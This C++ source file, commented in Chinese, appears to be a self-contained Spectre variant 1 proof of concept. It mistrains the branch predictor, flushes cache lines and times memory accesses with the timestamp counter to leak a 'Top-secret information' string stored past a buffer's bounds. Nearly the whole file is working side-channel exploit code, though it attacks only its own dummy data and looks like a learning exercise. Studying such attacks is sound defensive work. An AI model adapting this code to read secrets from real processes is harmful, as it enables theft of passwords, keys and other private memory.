#include <array>
#include <cstddef>
#include <iostream>
#include <unordered_map>
#include <string.h>
#include <memory>
#include <chrono>
#include <set>
#include <thread>

// #include <emmintrin.h>
#include <x86intrin.h>

void access_memory(const void* p) {
    __asm__ __volatile__("" ::
        "r"(*static_cast<const uint8_t*>(p)) : "memory");
}

// using std::chrono::duration_cast;
// using std::chrono::nanoseconds;
// using std::chrono::high_resolution_clock;

// long get_time() {
//     return duration_cast<nanoseconds>(high_resolution_clock::now().time_since_epoch()).count();
// }
long get_time() {
    unsigned int i;
    return __rdtscp(&i); // GCC/Clang内置time-stamp counter, TSC
}

template<typename T>
double average(const T& a, size_t skip_index) {
    double res = 0;
    for (size_t i = 0; i < a.size(); ++i) {
        if (i != skip_index) res += a[i];
    }
    return res / (a.size() - 1);
}

template <typename L, typename S>
void score_latencies(const L& latencies, S& scores, size_t ok_index) {
    const double average_latency = average(latencies, ok_index);
    constexpr double latency_threshold = 0.5;
    // std::cout << "average: " << average_latency << std::endl;
    // std::cout << "ok_index: " << ok_index << std::endl;
    // std::cout << "latencies " << std::endl;
    for (size_t i = 0; i < latencies.size(); i++) {
        // std::cout << latencies[i] << std::endl;
        if (ok_index != i && latencies[i] < average_latency * latency_threshold)
            ++scores[i];
    }

}

template <typename S>
std::pair<size_t, size_t> best_scores(const S& scores) {
    size_t i1 = 0, i2 = -1;

    // std::cout << "scores: " << std::endl;
    for (size_t i = 0; i < scores.size(); i++) {
        if (scores[i] > 0) {
            // std::cout << "i = " << i << ", score: " << scores[i] << std::endl;
        }

        if (scores[i] > scores[i1]) {
            i2 = i1;
            i1 = i;
        } else if (i != i1 && (i2 == -1 || scores[i] > scores[i2])) {
            i2 = i;
        }
    }
    // std::cout << "i1 = " << i1 << ", i2 = " << i2 << std::endl;
    return {i1, i2};
}

struct timing_element { char s[4096]; };
void victim_func(size_t array_size,size_t i, const char* data, struct timing_element *timing_array) {
    if (i < array_size) {
        access_memory(timing_array + data[i]);
    }
}

char spectre_attack(const char* data,
                    std::size_t size,
                    size_t evil_index) {

    constexpr size_t num_val = 256;
    static timing_element timing_array[num_val];
    ::memset(timing_array, 1, sizeof(timing_array));

    std::array<long, num_val> latencies = {};
    std::array<int, num_val> scores = {};
    size_t i1 = 0, i2 = 0; // 两个最高分
    std::unique_ptr<size_t> data_size (new size_t(size));
    std::unique_ptr<size_t>* second_ptr_data_size = &data_size;

    constexpr size_t n_iter = 1000;
    for (size_t i_iter = 0; i_iter < n_iter; ++i_iter) {
        for (size_t i = 0; i < num_val; i++) {
            // 在头文件emmintrin.h中声明
            _mm_clflush(timing_array + i); // 从缓存中清除计时数组
        }

        const size_t ok_index = i_iter % size;
        constexpr size_t n_read = 29;
        // constexpr size_t n_read = 20;
        // 这个n_read不能太大，太大就被分支预测其训练到了 i的计算逻辑
        // constexpr size_t n_read = 100;

        for (size_t i_read = 0; i_read < n_read; i_read++) {
            _mm_clflush(&*data_size);
            _mm_clflush(&*second_ptr_data_size);
            for (volatile int z = 0; z < 1000; ++z) {} // 增加延迟
            // std::this_thread::sleep_for(std::chrono::microseconds(1000));

            // // 训练分支预测器，16次预测错一次
            const size_t i = (i_read & 0xf) ? ok_index : evil_index;

            if (i < **second_ptr_data_size) {
            // if (i < *data_size) {
                // 正确预测会加载ok_index处的缓存，预测错误会加载evil_index处的缓存
                access_memory(timing_array + data[i]);
            }

            // size_t training_x, x;
            // // x = i;
            // training_x = ok_index;
			// /* Bit twiddling to set x=training_x if j%6!=0 or malicious_x if j%6==0 */
			// /* Avoid jumps in case those tip off the branch predictor */
			// x = ((i_read % 6) - 1) & ~0xFFFF; /* Set x=FFF.FF0000 if j%6==0, else x=0 */
			// x = (x | (x >> 16)); /* Set x=-1 if j%6=0, else x=0 */
			// x = training_x ^ (x & (evil_index ^ training_x));

            // if (x < **second_ptr_data_size) {
            // // if (i < *data_size) {
            //     // 正确预测会加载ok_index处的缓存，预测错误会加载evil_index处的缓存
            //     access_memory(timing_array + data[x]);
            // }
            // victim_func(**second_ptr_data_size, i, data, timing_array);
        }

        // std::cout << "i_rand: " << std::endl;
        // std::set<size_t> i_rand_set;
        for (size_t i = 0; i < num_val; i++) {
            const size_t i_rand = (i * 167 + 13) & 0xff;
            // std::cout << i_rand << std::endl;
            // i_rand_set.insert(i_rand);
            // 随机化
            const timing_element* const p = timing_array + i_rand;
            const long t0 = get_time();
            access_memory(p);
            latencies[i_rand] = get_time() - t0;
        }
        // std::cout << "irand count: " << i_rand_set.size() << std::endl;
        score_latencies(latencies, scores, ok_index);
        std::tie(i1, i2) = best_scores(scores);
        // std::cout << "i1 = " << i1 << ", i2 = " << i2 << std::endl;
        constexpr int threshold1 = 2, threshold2 = 100;
        if (scores[i1] >
            scores[i2] * threshold1 + threshold2) return i2;
    }

    return i2;
}

int main() {

    // size_t size = 4096;
    // char data[size] = {};

    // 如果size是变量，用变量定义data数组，此时数组是不能初始化的，否则报错如下：
    // error: variable-sized object may not be initialized


    constexpr size_t size = 4096;
    // char data[size * 2] = {};
    char *data = new char[size*2];
    strcpy(data, "Innocuous data");
    strcpy(data + size, "Top-secret information");
    for (size_t i = 0; i < size; ++i) {
        const char c = spectre_attack(data, size, size + i);
        if (c >= 'a' && c <= 'z' || (c >= 'A' && c <= 'Z') || c== ' ')
            std::cout << c << std::flush;
        // if (!c) break;
        if (i > 22) break;
        // std::this_thread::sleep_for(std::chrono::seconds(1));
    }
    std::cout << std::endl;


    return 0;
}
